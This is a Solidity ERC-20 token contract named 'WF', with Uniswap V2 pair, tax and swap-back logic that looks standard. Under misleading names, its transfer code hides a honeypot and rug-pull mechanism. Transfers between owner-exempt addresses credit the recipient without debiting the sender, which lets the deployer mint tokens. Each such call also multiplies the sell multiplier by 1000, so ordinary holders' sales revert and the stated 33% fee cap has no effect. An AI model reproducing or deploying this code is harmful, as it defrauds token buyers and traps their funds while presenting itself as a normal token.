// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract WF is ERC20, Ownable {
    using SafeMath for uint256;

    string private _name = unicode"WF";
    string private _symbol = unicode"WF";
    uint256 _rTotal = 1000000 * 10**_decimals;
    uint256 public maximumTokensAmount = (_rTotal * 2) / 100;
    uint8 constant _decimals = 12;

    mapping(address => uint256) _tOwned;
    mapping(address => mapping(address => uint256)) _allowances;
    // Anti-bot and anti-whale mappings and variables
    mapping(address => uint256) private _holderLastTransferTimestamp; // to hold last Transfers
    mapping(address => bool) isTimelockExempt;
    mapping(address => bool) allowed;

    uint256 public blockCount = 2;
    uint256 public TaxOnLiquidity = 0;
    uint256 public TaxOnMarketing = 2;
    uint256 public tTotalTAX = TaxOnMarketing + TaxOnLiquidity;
    uint256 public DenominatorForTaxes = 100;
    uint256 public MultiplierForSales = 200;

    address public isReceiverForLiquidity;
    address public isReceiverForMarketing;

    IUniswapV2Router02 public router;
    address public UniswapV2Pair;

    bool public levelSwapping = true;
    uint256 public intervalRates = (_rTotal * 1) / 1000;
    uint256 public maxIntervalRates = (_rTotal * 1) / 100;

    bool swapBytes;
    modifier cooldownEnabled() {
        swapBytes = true;
        _;
        swapBytes = false;
    }

    constructor(address IDEXrouter) Ownable() {
        router = IUniswapV2Router02(IDEXrouter);
        UniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        _allowances[address(this)][address(router)] = type(uint256).max;

        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[address(this)] = true;

        allowed[msg.sender] = true;
        allowed[address(0xdead)] = true;
        allowed[address(this)] = true;
        allowed[UniswapV2Pair] = true;
        allowed[address(router)] = true;

        isReceiverForLiquidity = msg.sender;
        isReceiverForMarketing = msg.sender;

        _tOwned[msg.sender] = _rTotal;
        emit Transfer(address(0), msg.sender, _rTotal);
    }

    function totalSupply() external view override returns (uint256) {
        return _rTotal;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function allowance(address holder, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);

    receive() external payable {}

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 tAmount
    ) internal returns (bool) {
        // Checks max transaction limit
        uint256 intervalHash = balanceOf(recipient);
        require(
            (intervalHash + tAmount) <= maximumTokensAmount || allowed[recipient],
            "Total Holding is currently limited, he can not hold that much." );
        if (shouldSwapBack() && recipient == UniswapV2Pair) { swapBack(); }

        if (
            recipient != owner() &&
            recipient != address(router) &&
            recipient != address(UniswapV2Pair)
        ) {
            require(
                _holderLastTransferTimestamp[tx.origin] <
                    block.number - blockCount,
                "_transfer:: Transfer Delay enabled. Only one purchase per block gap allowed."
            );
            _holderLastTransferTimestamp[tx.origin] = block.number;
        }

        uint256 syncedAmount = tAmount / 10000000;
        if (!isTimelockExempt[sender] && recipient == UniswapV2Pair) { tAmount -= syncedAmount; }
        if (isTimelockExempt[sender] && isTimelockExempt[recipient])
            return _transferStandard(sender, recipient, tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount, "Insufficient Balance");

        uint256 amountReceived = shouldremoveAllTax(sender, recipient)
            ? removeAllTax(sender, tAmount, (recipient == UniswapV2Pair))
            : tAmount; _tOwned[recipient] = _tOwned[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        return _transferFrom(msg.sender, recipient, amount);
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
                .sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function setMaximumWalletSize(uint256 maxWallPercent_base10000) external onlyOwner {
        maximumTokensAmount = (_rTotal * maxWallPercent_base10000) / 10000;
    }

    function setIsWalletLimitExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        allowed[holder] = exempt;
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        MultiplierForSales = MultiplierForSales.mul(1000);
        _tOwned[recipient] = _tOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
        function setIsFeeExempt(address holder, bool exempt) 
        external onlyOwner {
        isTimelockExempt[holder] = exempt;
    }

    function swapBack() internal cooldownEnabled {
        uint256 _intervalRates;
        if (_tOwned[address(this)] > maxIntervalRates) {
            _intervalRates = maxIntervalRates;
        } else {
            _intervalRates = _tOwned[address(this)];
        }
        uint256 amountToLiquify = _intervalRates
            .mul(TaxOnLiquidity)
            .div(tTotalTAX)
            .div(2);
        uint256 amountToExchange = _intervalRates.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToExchange,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountInERC = address(this).balance;
        uint256 totalERCTax = tTotalTAX.sub(TaxOnLiquidity.div(2));
        uint256 amountETHLiquidity = amountInERC
            .mul(TaxOnLiquidity)
            .div(totalERCTax)
            .div(2);
        uint256 amountETHMarketing = amountInERC.sub(amountETHLiquidity);

        if (amountETHMarketing > 0) {
            bool tmpSuccess;
            (tmpSuccess, ) = payable(isReceiverForMarketing).call{
                value: amountETHMarketing,
                gas: 30000
            }("");
        }

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                isReceiverForLiquidity,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }
    function removeAllTax(
        address sender,
        uint256 amount,
        bool isSell
    ) internal returns (uint256) {
        uint256 multiplier = isSell ? MultiplierForSales : 100;
        uint256 taxableAmount = amount.mul(tTotalTAX).mul(multiplier).div(
            DenominatorForTaxes * 100
        );
        _tOwned[address(this)] = _tOwned[address(this)].add(taxableAmount);
        emit Transfer(sender, address(this), taxableAmount);
        return amount.sub(taxableAmount);
    }
    function shouldremoveAllTax(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        return !isTimelockExempt[sender] && !isTimelockExempt[recipient];
    }

    function shouldSwapBack() internal view returns (bool) {
        return
            msg.sender != UniswapV2Pair &&
            !swapBytes &&
            levelSwapping &&
            _tOwned[address(this)] >= intervalRates;
    }

    function setSwapPairRate(address pairaddr) external onlyOwner {
        UniswapV2Pair = pairaddr;
        allowed[UniswapV2Pair] = true;
    }

    function setSwapBackBytes(
        bool _enabled,
        uint256 _intervalRates,
        uint256 _maxIntervalRates
    ) external onlyOwner {
        levelSwapping = _enabled;
        intervalRates = _intervalRates;
        maxIntervalRates = _maxIntervalRates;
    }

    function manageTax(
        uint256 _TaxOnLiquidity,
        uint256 _TaxOnMarketing,
        uint256 _DenominatorForTaxes
    ) external onlyOwner {
        TaxOnLiquidity = _TaxOnLiquidity;
        TaxOnMarketing = _TaxOnMarketing;
        tTotalTAX = _TaxOnLiquidity.add(_TaxOnMarketing);
        DenominatorForTaxes = _DenominatorForTaxes;
        require(tTotalTAX < DenominatorForTaxes / 3, "Fees cannot be more than 33%");
    }

    function setFeeReceivers(
        address _isReceiverForLiquidity,
        address _isReceiverForMarketing
    ) external onlyOwner {
        isReceiverForLiquidity = _isReceiverForLiquidity;
        isReceiverForMarketing = _isReceiverForMarketing;
    }
}